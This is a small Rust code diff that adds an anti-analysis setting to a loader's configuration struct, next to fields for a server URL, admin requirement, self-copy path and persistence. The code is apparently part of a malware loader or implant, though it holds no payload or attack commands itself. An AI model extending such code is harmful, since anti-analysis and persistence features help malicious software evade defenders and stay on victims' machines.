@@ -1,4 +1,4 @@
-use libra_common::models::InjectedConfig;
+use libra_common::models::{AntiAnalysisConfig, InjectedConfig};
 
 pub struct LoaderConfig {
     pub server_url: String,
@@ -8,6 +8,7 @@ pub struct LoaderConfig {
     pub require_admin: bool,
     pub copy_to_path: Option<String>,
     pub enable_persistence: bool,
+    pub anti_analysis: AntiAnalysisConfig,
     /// Full InjectedConfig JSON to pass to core_main
     pub config_json: String,
 }
@@ -22,6 +23,7 @@ impl LoaderConfig {
             require_admin: injected.require_admin,
             copy_to_path: injected.copy_to_path,
             enable_persistence: injected.enable_persistence,
+            anti_analysis: injected.anti_analysis,
             config_json: raw_json,
         }
     }
